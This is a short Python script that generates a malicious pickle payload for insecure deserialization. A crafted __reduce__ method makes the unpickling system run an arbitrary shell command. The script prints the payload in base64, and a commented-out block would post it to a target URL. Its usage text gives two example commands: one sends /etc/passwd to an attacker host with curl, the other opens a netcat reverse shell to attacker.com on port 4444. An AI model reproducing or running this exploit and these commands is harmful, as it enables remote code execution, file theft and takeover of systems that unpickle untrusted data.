#!/usr/bin/env python
from __future__ import print_function
import codecs
import pickle
import subprocess
try:
    import urllib2 as r
except ImportError:
    import urllib.request as r


def exploit(cmd):
    class Exploit(object):
        def __reduce__(self):
            # We want shell=True so that we can pass cmd as a string directly.
            # There's no easy way to use kwargs in __reduce__, so we fill in
            # defaults until the shell=True argument.
            return (
                subprocess.call,
                (cmd, 0, None, None, None, None, None, False, True)
            )

    return Exploit()


USAGE = '''
  Usage: {} CMD
    CMD is any valid shell expression

  Examples:
    python {} 'curl -sF "file=@/etc/passwd" attacker.com/exfil'
    python {} 'rm /tmp/a;mkfifo /tmp/a;/bin/sh -i </tmp/a 2>&1|nc attacker.com 4444 >/tmp/a'
'''.format(__file__, __file__, __file__)


if __name__ == '__main__':
    import sys

    # if len(sys.argv) < 3:
    if len(sys.argv) != 2:
        sys.stderr.write(USAGE)
        sys.exit(1)

    # url, cmd = sys.argv[1], sys.argv[2:]
    # payload = codecs.encode(pickle.dumps(exploit(cmd)), 'base64')
    # req = r.Request(url, payload)
    # resp = r.urlopen(req)

    # print('Response from server:')
    # print(resp.read())

    cmd = sys.argv[1]
    payload = codecs.encode(pickle.dumps(exploit(cmd)), 'base64')
    print(payload)
